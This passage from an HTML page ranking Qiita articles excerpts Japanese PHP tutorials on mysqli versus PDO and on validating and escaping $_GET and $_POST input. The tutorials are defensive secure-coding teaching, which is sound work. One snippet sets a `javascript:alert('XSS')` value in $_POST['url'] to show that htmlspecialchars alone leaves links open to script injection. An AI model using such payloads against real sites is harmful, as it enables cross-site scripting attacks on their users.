<span id="mysqliクラス-またはmysqli関数" class="fragment"></span><a href="#mysqli%E3%82%AF%E3%83%A9%E3%82%B9-%E3%81%BE%E3%81%9F%E3%81%AFmysqli%E9%96%A2%E6%95%B0"><i class="fa fa-link"></i></a><a href="http://www.php.net/manual/ja/book.mysqli.php" rel="nofollow noopener" target="_blank">mysqliクラス (またはmysqli関数)</a>
</h3>

<p>手続き型(関数)とオブジェクト指向型(クラス)を両方ともサポートしています．</p>

<h4>
<span id="メリット" class="fragment"></span><a href="#%E3%83%A1%E3%83%AA%E3%83%83%E3%83%88"><i class="fa fa-link"></i></a><font color="silver">メリット</font>
</h4>

<ul>
<li>動作が <strong>非常に</strong> 速い．</li>
<li>(手続き型の場合は) mysql関数からの書き換えが容易．</li>
<li>プリペアドステートメントで型を指定しながら複数のバインドが同時に <strong>できる</strong> ．</li>
<li>
<strong>マルチクエリ</strong> を使用できる．1回の関数コールで複数のクエリが実行できるため，普通に2回コールする場合に比べてパフォーマンスは向上する．</li>
<li>エラーを例外としてスローさせることができる．2種類の設定方法があるが，これに関しては<ins>他の記述がオブジェクト指向型でも手続き型を採用すべき</ins>であると言える．明らかに手続き型の方がスッキリと書ける．</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">オブジェクト指向型</span></div>
<div class="highlight"><pre><span></span><span class="nv">$driver</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli_driver</span><span class="p">();</span>
<span class="nv">$driver</span><span class="o">-&gt;</span><span class="na">report_mode</span> <span class="o">=</span> <span class="nx">MYSQLI_REPORT_ERROR</span> <span class="o">|</span> <span class="nx">MYSQLI_REPORT_STRICT</span><span class="p">;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">手続き型</span></div>
<div class="highlight"><pre><span></span><span class="nb">mysqli_report</span><span class="p">(</span><span class="nx">MYSQLI_REPORT_ERROR</span> <span class="o">|</span> <span class="nx">MYSQLI_REPORT_STRICT</span><span class="p">);</span>
</pre></div>
</div>

<ul>
<li>不適切なインデックスを含むクエリに対しても，例外をスローさせることができる．開発段階でデータベースに負荷をかけてしまうクエリを潰すことが出来る利点がある．これを有効化するためには，下記のようにする． <code>MYSQLI_REPORT_ALL</code> でまとめる手もある．</li>
</ul>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">mysqli_report</span><span class="p">(</span><span class="nx">MYSQLI_REPORT_ERROR</span> <span class="o">|</span> <span class="nx">MYSQLI_REPORT_STRICT</span> <span class="o">|</span> <span class="nx">MYSQLI_REPORT_INDEX</span><span class="p">);</span>
</pre></div></div>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">mysqli_report</span><span class="p">(</span><span class="nx">MYSQLI_REPORT_ALL</span><span class="p">);</span>
</pre></div></div>

<ul>
<li><a href="http://d.hatena.ne.jp/kiyo560808/20101117/1289952549" rel="nofollow noopener" target="_blank">久保清隆の成長ノート - MySQLパフォーマンスチューニングのためのインデックスの基礎知識</a></li>
</ul>

<h4>
<span id="デメリット" class="fragment"></span><a href="#%E3%83%87%E3%83%A1%E3%83%AA%E3%83%83%E3%83%88"><i class="fa fa-link"></i></a><font color="silver">デメリット</font>
</h4>

<ul>
<li>プリペアドステートメントで名前付きプレースホルダが <strong>使えない</strong> ．</li>
<li>
<strong>「プリペアドステートメント ≠ 結果セット」</strong> であり，SQL実行後にプリペアドステートメントから結果セットを取り出す必要がある．この点は次に紹介するPDOクラスと大きく異なる．</li>
<li>その他の点でも多機能すぎる為，初心者が混乱しやすい．</li>
</ul>

<h3>
<span id="pdoクラス" class="fragment"></span><a href="#pdo%E3%82%AF%E3%83%A9%E3%82%B9"><i class="fa fa-link"></i></a><a href="http://php.net/manual/ja/book.pdo.php" rel="nofollow noopener" target="_blank">PDOクラス</a>
</h3>

<p>オブジェクト指向型のみをサポートしています．</p>

<h4>
<span id="メリット-1" class="fragment"></span><a href="#%E3%83%A1%E3%83%AA%E3%83%83%E3%83%88-1"><i class="fa fa-link"></i></a><font color="silver">メリット</font>
</h4>

<ul>
<li>動作が速い．</li>
<li>エラーを例外としてスローさせることが出来る．但し，一部の特例を除き，<ins>コンストラクタは常に例外をスローする</ins>．</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PDOクラスで例外をスローさせる</span></div>
<div class="highlight"><pre><span></span><span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">setAttribute</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_ERRMODE</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">ERRMODE_EXCEPTION</span><span class="p">);</span>
</pre></div>
</div>

<ul>
<li>
<strong>「プリペアドステートメント ＝ 結果セット」</strong> であり，mysqliクラスに比べると初心者にも分かりやすい．</li>
<li>プリペアドステートメントで名前付きプレースホルダが <strong>使える</strong> ．</li>
<li>プリペアドステートメントのエミュレーションを行う場合は <strong>同名の名前付きプレースホルダを複数回使える</strong> ．但し，エミュレーションを設定していないと <code>SQLSTATE[HY093]: Invalid parameter number</code> が発生する．</li>
<li>他のデータベースへ乗り換える際，書き換えが容易．PDOクラスの使い方だけを覚えておけばドライバが存在するあらゆるデータベースに対応が出来るようになる．</li>
</ul>

<h4>
<span id="デメリット-1" class="fragment"></span><a href="#%E3%83%87%E3%83%A1%E3%83%AA%E3%83%83%E3%83%88-1"><i class="fa fa-link"></i></a><font color="silver">デメリット</font>
</h4>

<ul>
<li>プリペアドステートメントで型を指定しながら複数のバインドが同時に <strong>できない</strong> ．</li>
<li>
<code>SET NAMES sjis</code> や <code>SET CHARACTER SET sjis</code> を設定している場合，プリペアドステートメントのエミュレーションを無効にしておかないと脆弱性が発生する．</li>
<li>プリペアドステートメントのエミュレーションを行う場合は <a href="http://www.php.net/manual/ja/pdostatement.bindvalue.php" rel="nofollow noopener" target="_blank">PDOStatement::bindValue</a>, <a href="http://www.php.net/manual/ja/pdostatement.bindparam.php" rel="nofollow noopener" target="_blank">PDOStatement::bindParam</a> メソッドで，<ins>指定した型と実際の型が一致しない場合，全て文字列としてバインドされる</ins>．</li>
</ul>

<p><a href="http://pear.php.net/manual/ja/package.database.db.php" rel="nofollow noopener" target="_blank">PEAR::DB</a> や <a href="http://pear.php.net/manual/ja/package.database.mdb2.php" rel="nofollow noopener" target="_blank">PEAR::MDB2</a> に関しては,PDOが安定してきたPHP5.4系以降で使う必要性は皆無でしょう．PHPで実装された抽象化レイヤは，C言語で実装されたPDOよりも明らかにパフォーマンスが悪くなります．</p>

<ul>
<li><a href="http://zapanet.info/blog/item/972" rel="nofollow noopener" target="_blank">[Z]ZAPAブロ～グ2.0 - PDO，PEAR::DB，Mysql関数の速度比較</a></li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />2位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>925</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/2f9955db1c02eeef43ea">$_GET, $_POSTなどを受け取る際の処理</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-07-15 20:14:32</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="予備知識" class="fragment"></span><a href="#%E4%BA%88%E5%82%99%E7%9F%A5%E8%AD%98"><i class="fa fa-link"></i></a>予備知識</h1>

<p>PHPはフォームから送信された値などをコード実行開始に自動的に変数として使えるようにしてくれる非常に便利なプログラミング言語です．しかし，それをそのまま用いるとエラーが発生したり，脆弱性になってしまったりするケースがたくさんあります．使う前には適当なチェック処理が必要です．</p>

<h2>
<span id="どういった変数が対象になるか" class="fragment"></span><a href="#%E3%81%A9%E3%81%86%E3%81%84%E3%81%A3%E3%81%9F%E5%A4%89%E6%95%B0%E3%81%8C%E5%AF%BE%E8%B1%A1%E3%81%AB%E3%81%AA%E3%82%8B%E3%81%8B"><i class="fa fa-link"></i></a>どういった変数が対象になるか</h2>

<p>以下に挙げられた変数は，ユーザーが勝手に値や構造を書き換えたり，送信をそもそも行わずにアクセスしたりすることが可能な<ins>信用できない変数</ins>だと思ってください．例え，ラジオボタンで選択肢を限定していたり，隠し要素として埋め込んでいたりしたとしても，これに該当してしまいます．</p>

<h3>
<span id="_get" class="fragment"></span><a href="#_get"><i class="fa fa-link"></i></a><code>$_GET</code>
</h3>

<ul>
<li>アクセスされたURLの <code>?</code> 以降のクエリーストリングに含まれる情報．</li>
<li>
<code>method</code> 属性の値が <code>get</code> であるフォームから送られた情報．</li>
</ul>

<h3>
<span id="_post" class="fragment"></span><a href="#_post"><i class="fa fa-link"></i></a><code>$_POST</code>
</h3>

<ul>
<li>
<code>method</code> 属性の値が <code>post</code> であるフォームから送られた情報．</li>
</ul>

<h3>
<span id="_cookie" class="fragment"></span><a href="#_cookie"><i class="fa fa-link"></i></a><code>$_COOKIE</code>
</h3>

<ul>
<li>Webブラウザから送信されるクッキー．</li>
</ul>

<h3>
<span id="_request" class="fragment"></span><a href="#_request"><i class="fa fa-link"></i></a><code>$_REQUEST</code>
</h3>

<ul>
<li>
<code>$_GET</code> <code>$_POST</code> <code>$_COOKIE</code> の内容が合成されて作られたもの．</li>
</ul>

<p>なお， <code>$_SESSION</code> はサーバー側に保存される変数なので，このチェック対象にはなりません．チェックすべきはセッションの有効期限が切れていないか，つまり <code>$_SESSION</code> が空になってしまっていないかどうかです．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">セッションの有効期限切れをチェック</span></div>
<div class="highlight"><pre><span></span><span class="nb">session_start</span><span class="p">();</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$_SESSION</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* セッション有効期限切れに対応する処理 */</span>
<span class="p">}</span>
</pre></div>
</div>

<p>これらの特殊な変数に関する詳細は <a href="http://qiita.com/mpyw/items/7852213f478e8c5a2802" id="reference-995d72aaf60c193be0aa">「リクエストパラメータ・セッションに関するまとめ」</a> で詳しく解説しています．</p>

<h2>
<span id="phpのエラーの種類" class="fragment"></span><a href="#php%E3%81%AE%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%AE%E7%A8%AE%E9%A1%9E"><i class="fa fa-link"></i></a>PHPのエラーの種類</h2>

<p>PHPには主に以下のようなエラーがあります． (これで全てではありません)</p>

<h3>
<span id="e_parse-別名-parse-error-syntax-error-文法エラー" class="fragment"></span><a href="#e_parse-%E5%88%A5%E5%90%8D-parse-error-syntax-error-%E6%96%87%E6%B3%95%E3%82%A8%E3%83%A9%E3%83%BC"><i class="fa fa-link"></i></a><strong>E_PARSE</strong> (別名: Parse Error, Syntax Error, 文法エラー)</h3>

<p>コードが文法的に誤っているときに発生します．一切の処理を行いません．</p>

<h3>
<span id="e_error-別名-fatal-error-致命的なエラー" class="fragment"></span><a href="#e_error-%E5%88%A5%E5%90%8D-fatal-error-%E8%87%B4%E5%91%BD%E7%9A%84%E3%81%AA%E3%82%A8%E3%83%A9%E3%83%BC"><i class="fa fa-link"></i></a><strong>E_ERROR</strong> (別名: Fatal Error, 致命的なエラー)</h3>

<p>処理を継続することが不可能になってしまった場合に発生します．発生したところで処理を停止します．これが発生するリスクを持つコードを書いてはいけません．</p>

<h3>
<span id="e_warning-別名-warning-警告" class="fragment"></span><a href="#e_warning-%E5%88%A5%E5%90%8D-warning-%E8%AD%A6%E5%91%8A"><i class="fa fa-link"></i></a><strong>E_WARNING</strong> (別名: Warning, 警告)</h3>

<p>処理を継続することは可能ですが，想定外の問題が起こったときに発生します．これが発生するリスクを持つコードは可能な限り書かないでおくべきです．</p>

<h3>
<span id="e_notice-別名-notice-通知" class="fragment"></span><a href="#e_notice-%E5%88%A5%E5%90%8D-notice-%E9%80%9A%E7%9F%A5"><i class="fa fa-link"></i></a><strong>E_NOTICE</strong> (別名: Notice, 通知)</h3>

<p>処理を継続することは可能ですが，想定内の問題が起こったときに発生します．これは手を抜いて無視する人と丁寧に対応する人に二分されますが，<ins>対応の仕方を知らないまま手抜きをするようなプログラマになってはならない</ins>と私は考えるので，ここでは徹底的に対応することにします．</p>

<h2>
<span id="エラー発生による弊害" class="fragment"></span><a href="#%E3%82%A8%E3%83%A9%E3%83%BC%E7%99%BA%E7%94%9F%E3%81%AB%E3%82%88%E3%82%8B%E5%BC%8A%E5%AE%B3"><i class="fa fa-link"></i></a>エラー発生による弊害</h2>

<ul>
<li>本番環境でエラーメッセージが表示されてしまうと，サーバーを攻撃しようと企む人にヒントを与えてしまう事になります．</li>
<li>ページのデザインが崩れて不格好になります．</li>
</ul>

<p>このため，エラーを表示させるのはデバッグ環境だけにすることが殆どです．但し，エラーを非表示にしたとしても…</p>

<ul>
<li>処理速度が低下します． </li>
<li>php.iniの設定によってはエラーログが溜まります．</li>
<li>php.iniの <strong>error_reporting</strong> の設定によっては表示されないエラーもありますが，処理速度の低下は防げません．</li>
<li>
<strong><a href="http://www.php.net/manual/ja/language.operators.errorcontrol.php" rel="nofollow noopener" target="_blank">エラー制御演算子</a> <code>@</code></strong> を使えば表示はされなくなりますが，処理速度の低下は防げません．またデバッグ環境で何らかのバグが発生してしまった状態でも，バグに関わるエラーメッセージが全て表示されなくなってしまいます．デバッグ作業がより難航することになるので，可能な限りこの演算子に頼ることは避けたほうが無難でしょう．</li>
</ul>

<p>このようにさまざまなデメリットがあるので，可能な限りエラー発生を防ぐように書きましょう．</p>

<h2>
<span id="全てのエラーを表示" class="fragment"></span><a href="#%E5%85%A8%E3%81%A6%E3%81%AE%E3%82%A8%E3%83%A9%E3%83%BC%E3%82%92%E8%A1%A8%E7%A4%BA"><i class="fa fa-link"></i></a>全てのエラーを表示</h2>

<p>php.iniを以下のように編集すれば全てのエラーが表示されるようになります．</p>

<div class="code-frame" data-lang="ini">
<div class="code-lang"><span class="bold">php.iniでの恒久的な設定</span></div>
<div class="highlight"><pre><span></span><span class="na">error_reporting</span> <span class="o">=</span> <span class="s">-1</span>
<span class="na">display_errors</span> <span class="o">=</span> <span class="s">On</span>
</pre></div>
</div>

<p>もしphp.iniの書き換えが出来ない場合，使用しているサーバーがApacheであれば以下のように <strong>.htaccess</strong> ファイルを設置することで対応できます．</p>

<div class="code-frame" data-lang="apache">
<div class="code-lang"><span class="bold">.htaccessでの恒久的な設定</span></div>
<div class="highlight"><pre><span></span><span class="nb">php_value</span> error_reporting -1
<span class="nb">php_flag</span> display_errors <span class="k">On</span>
</pre></div>
</div>

<p>それも不可能な場合や一時的に有効にしたい場合は，スクリプトの先頭で以下のコードを実行すればそれ以降は全てのエラーが表示されるようになります．但し <strong>E_PARSE</strong> はコードを読み取る段階で発生するエラーなので，これには対応することが出来ません．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">error_reporting</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'display_errors'</span><span class="p">,</span> <span class="s1">'On'</span><span class="p">);</span>
</pre></div></div>

<h2>
<span id="比較演算子--と--の比較" class="fragment"></span><a href="#%E6%AF%94%E8%BC%83%E6%BC%94%E7%AE%97%E5%AD%90--%E3%81%A8--%E3%81%AE%E6%AF%94%E8%BC%83"><i class="fa fa-link"></i></a>比較演算子 <code>==</code> と <code>===</code> の比較</h2>

<p>入門書などでは <code>==</code> が主体的に使われていることが多いですが，私は <code>===</code> に全て統一して使うことを推奨します．前者は <strong>型の相互変換</strong> を勝手に行います．PHP以外の言語出身者からすれば，これほど気持ち悪いものは無いでしょう．</p>

<ul>
<li><a href="http://us1.php.net/manual/ja/language.operators.comparison.php" rel="nofollow noopener" target="_blank">PHP Manual - 比較演算子</a></li>
</ul>

<h2>
<span id="htmlspecialchars-関数によるエスケープ処理" class="fragment"></span><a href="#htmlspecialchars-%E9%96%A2%E6%95%B0%E3%81%AB%E3%82%88%E3%82%8B%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97%E5%87%A6%E7%90%86"><i class="fa fa-link"></i></a><a href="http://www.php.net/manual/ja/function.htmlspecialchars.php" rel="nofollow noopener" target="_blank">htmlspecialchars</a> 関数によるエスケープ処理</h2>

<p>HTML中で特殊な意味を持つ文字列は必ずエスケープしなければなりません．ユーザーから入力された値に対してこの処理を怠ると <strong><a href="http://ja.wikipedia.org/wiki/%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0" rel="nofollow noopener" target="_blank">クロスサイトスクリプティング</a></strong> に関する脆弱性が発生してしまいます．</p>

<p>この処理を行うタイミングは<ins>表示する直前</ins>にしましょう．それ以外の場所でこの処理を行うべきではありません．例えばデータベースやファイルに格納するときにあらかじめエスケープしてしまうのは，ソフトウェア構成上の誤りだと言えます．</p>

<h3>
<span id="string" class="fragment"></span><a href="#string"><i class="fa fa-link"></i></a><code>$string</code>
</h3>

<p>エスケープしたい文字列を渡します．</p>

<h3>
<span id="flags" class="fragment"></span><a href="#flags"><i class="fa fa-link"></i></a><code>$flags</code>
</h3>

<p>フラグを指定します．省略した場合のデフォルト値は <code>ENT_COMPAT</code> となります．実際には <code>ENT_HTML401</code> との論理和となりますが，この関数の挙動には影響を及ぼさないのでここでは触れないことにします．詳しくは <strong><a href="http://qiita.com/mpyw/items/939c526dd5de6619b565" id="reference-cd98f1bf32985e4cae22">「htmlspecialchars関数やhtmlentities関数で使用されるフラグの検証」</a></strong> を参照してください．</p>

<h4>
<span id="ent_compat-でエスケープされる文字" class="fragment"></span><a href="#ent_compat-%E3%81%A7%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97%E3%81%95%E3%82%8C%E3%82%8B%E6%96%87%E5%AD%97"><i class="fa fa-link"></i></a><font color="silver">ENT_COMPAT でエスケープされる文字</font>
</h4>

<p><code>&lt;</code> <code>&gt;</code> <code>&amp;</code> <code>"</code></p>

<p>属性値を全てダブルクオーテーションで括っているのであればこれで問題はありません．但し，エスケープすれば安全だと思って安易に属性値として埋め込むのは避けましょう．例えば以下のケースではリンクをクリックしたときにJavaScriptが実行されてしまいます．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">不十分なXSS対策</span></div>
<div class="highlight"><pre><span></span><span class="c1">// $_POST['url'] = "javascript:alert('XSS')"; とする</span>
<span class="nv">$url</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">]);</span>
<span class="k">echo</span> <span class="s1">'&lt;a href="'</span> <span class="o">.</span> <span class="nv">$url</span> <span class="o">.</span> <span class="s1">'"&gt;リンク&lt;/a&gt;'</span><span class="p">;</span>
</pre></div>
</div>

<h4>
<span id="ent_quotes-でエスケープされる文字" class="fragment"></span><a href="#ent_quotes-%E3%81%A7%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97%E3%81%95%E3%82%8C%E3%82%8B%E6%96%87%E5%AD%97"><i class="fa fa-link"></i></a><font color="silver">ENT_QUOTES でエスケープされる文字</font>
</h4>

<p><code>&lt;</code> <code>&gt;</code> <code>&amp;</code> <code>'</code> <code>"</code></p>

<p>これを指定しておくのが一番無難ですが，こちらも上記と同様に埋め込む対象となる属性によってはリスクが発生するので細心の注意を払ってください．</p>

<h3>
<span id="encoding" class="fragment"></span><a href="#encoding"><i class="fa fa-link"></i></a><code>$encoding</code>
</h3>

<p>エンコーディングを指定します． PHP5.4以降とPHP5.3以前でデフォルト値が異なり，前者では <code>UTF-8</code> ，後者では <code>ISO-8859-1</code> となっています．前者であれば指定を省略することが可能ですが，バージョンによって挙動が異なってしまうのも問題なので，省略せずに指定することがマニュアルでも強く推奨されています．</p>

<p><ins>ここまでは省略できない必須パラメータだと思ってください</ins>．</p>

<h3>
<span id="double_encode" class="fragment"></span><a href="#double_encode"><i class="fa fa-link"></i></a><code>$double_encode</code>
</h3>

<p><code>&amp;amp;</code> <code>&amp;lt;</code> <code>&amp;gt;</code> </p>

<p>のように既にエスケープされている文字をもう一度エスケープして</p>

<p><code>&amp;amp;amp;</code> <code>&amp;amp;lt;</code> <code>&amp;amp;gt;</code></p>

<p>とするかどうかを論理値で指定します．デフォルトは <code>true</code> です．</p>

<h3>
<span id="ラクに記述できる方法" class="fragment"></span><a href="#%E3%83%A9%E3%82%AF%E3%81%AB%E8%A8%98%E8%BF%B0%E3%81%A7%E3%81%8D%E3%82%8B%E6%96%B9%E6%B3%95"><i class="fa fa-link"></i></a>ラクに記述できる方法</h3>

<p>表示するときに毎回</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</pre></div></div>

<p>と書くのは非常に煩わしいので，</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<p>のような関数を作っておくと</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</pre></div></div>

<p>として簡潔に書くことが出来ます．ここから末尾のセミコロンは省略して</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</pre></div></div>

<p>とすることができ，更に <strong>echo短縮構文</strong> を使えば何と</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</pre></div></div>

<p>ここまで短く出来てしまいます．非常に便利な構文なのですが，これがデフォルトで使えるのは <strong>PHP5.4以降</strong> のみで，それより古いバージョンの場合はphp.iniで <code>short_open_tag</code> が有効化されている場合にしか使えません．もしphp.iniの書き換えが出来ない場合，使用しているサーバーがApacheであれば以下のように <strong>.htaccess</strong> ファイルを設置することで対応できます．</p>

<div class="code-frame" data-lang="apache">
<div class="code-lang"><span class="bold">.htaccess</span></div>
<div class="highlight"><pre><span></span><span class="nb">php_flag</span> short_open_tag <span class="k">on</span>
</pre></div>
</div>

<h1>
<span id="チェック処理の概要" class="fragment"></span><a href="#%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF%E5%87%A6%E7%90%86%E3%81%AE%E6%A6%82%E8%A6%81"><i class="fa fa-link"></i></a>チェック処理の概要</h1>

<h2>
<span id="isset" class="fragment"></span><a href="#isset"><i class="fa fa-link"></i></a><a href="http://www.php.net/manual/ja/function.isset.php" rel="nofollow noopener" target="_blank">isset</a>
</h2>

<h3>
<span id="エラーの発生するケース" class="fragment"></span><a href="#%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%AE%E7%99%BA%E7%94%9F%E3%81%99%E3%82%8B%E3%82%B1%E3%83%BC%E3%82%B9"><i class="fa fa-link"></i></a>エラーの発生するケース</h3>

<p>PHPでは，原則的に未定義の変数や配列インデックスの値を表示または取得しようとしたとき， <strong>E_NOTICE</strong> レベルのエラーが発生します．</p>

<ul>
<li>変数が未定義<br>
→ <strong>Notice:  Undefined variable</strong>
</li>
<li>配列インデックスが未定義<br>
→ <strong>Notice:  Undefined index</strong>
</li>
</ul>

<p>つまり，手抜きコーディングでよくある以下のようなチェック処理は不適当です．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$errors</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'Eメールアドレスが入力されていません'</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<p>実際にフォームから送信してそのページに遷移した場合にはエラーは発生しませんが，<ins>直接そのページにアクセスした場合には</ins><strong><code>$_POST['email']</code></strong><ins>は未定義</ins>となるので，以下のエラーが発生してしまいます．</p>

<div class="code-frame" data-lang="txt">
<div class="code-lang"><span class="bold">エラー</span></div>
<div class="highlight"><pre><span></span>Notice:  Undefined index: email
</pre></div>
</div>

<p>なお，この手抜きのケースでは <code>===</code> を用いることは出来ません． 未定義の値を <strong>E_NOTICE</strong> レベルのエラーを発生しながら強引に取得しようとしたときその値は <code>NULL</code> と見なされるので， <strong>型の相互変換</strong> により <code>NULL</code> を <code>""</code> として判定させなければ正しい動作をすることが出来ないからです．</p>

<h3>
<span id="エラーの発生を防ぐ方法" class="fragment"></span><a href="#%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%AE%E7%99%BA%E7%94%9F%E3%82%92%E9%98%B2%E3%81%90%E6%96%B9%E6%B3%95"><i class="fa fa-link"></i></a>エラーの発生を防ぐ方法</h3>

<p><a href="http://www.php.net/manual/ja/function.isset.php" rel="nofollow noopener" target="_blank">isset</a> は，変数が <strong>未定義でない</strong> かつ <strong>NULLでない</strong> ことをエラーを発生させずにチェックすることが出来ます．但し，外部からの入力を格納した変数が <code>NULL</code> を取るケースは存在しないので，このような使い方をする上では単に未定義でないかどうかのチェックを行うものとして考えていただいて構いません．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$errors</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'Eメールアドレスが送信されていません'</span><span class="p">;</span>
<span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$errors</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'Eメールアドレスが入力されていません'</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<p>「送信されていない」と「入力されていない」を区別する必要がない場合，以下のようにまとめてしまっても構いません．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$errors</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'Eメールアドレスが入力されていません'</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<h2>
<span id="is_string-関数is_array-関数" class="fragment"></span><a href="#is_string-%E9%96%A2%E6%95%B0is_array-%E9%96%A2%E6%95%B0"><i class="fa fa-link"></i></a><a href="http://www.php.net/manual/ja/function.is-string.php" rel="nofollow noopener" target="_blank">is_string</a> 関数<br><a href="http://www.php.net/manual/ja/function.is-array.php" rel="nofollow noopener" target="_blank">is_array</a> 関数</h2>

<p>最初に紹介した <a href="http://www.php.net/manual/ja/function.isset.php" rel="nofollow noopener" target="_blank">isset</a> によるチェックだけで自然な利用方法でも発生してしまう大半のエラーは防ぐことが出来ます．しかし，厳密に全てのエラーを潰すにはまだ不十分です．外部からの入力で受け取るものには <strong>文字列</strong> と <strong>配列</strong> の2種類があるからです．</p>

<p>例えば，こういうコードがあったとします．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">http</span></div>
